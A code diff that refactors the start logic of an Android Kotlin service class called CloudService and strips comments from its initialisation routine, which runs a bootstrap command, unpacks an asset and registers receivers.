@@ -33,26 +33,29 @@ class CloudService : Service() {
     companion object {
         fun isWorking(context: Context): Boolean {
             val manager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
+
             for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                 if (CloudService::class.java.name.equals(service.service.className)) {
                     return true
                 }
             }
+
             return false
         }
 
         fun start(context: Context, action: String = "") {
-            if (Settings.isServiceEnabled) {
-                val serviceIntent = Intent(context, CloudService::class.java)
-                if (action.isNotEmpty()) {
-                    serviceIntent.action = action
-                }
+            if (!Settings.isServiceEnabled) return
 
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    context.startForegroundService(serviceIntent)
-                } else {
-                    context.startService(serviceIntent)
-                }
+            val serviceIntent = Intent(context, CloudService::class.java)
+
+            if (action.isNotEmpty()) {
+                serviceIntent.action = action
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent)
+            } else {
+                context.startService(serviceIntent)
             }
         }
 
@@ -109,20 +112,15 @@ class CloudService : Service() {
 
     private fun init2() {
         try {
-            /* Write device features */
             Features().write(Env.featuresFilePath)
 
             /* Bootstrap */
             cc.executeCommand("!modules")
             cc.executeBootstrap()
 
-            /* Unpack assets */
             unpackAsset(ALARM_ASSET)
-
-            /* Register receivers */
             receivers.registerPersistentReceivers()
 
-            /* Get and watch for clt / ctlq */
             getCtlqFile()
             startCtlWatcher()
 
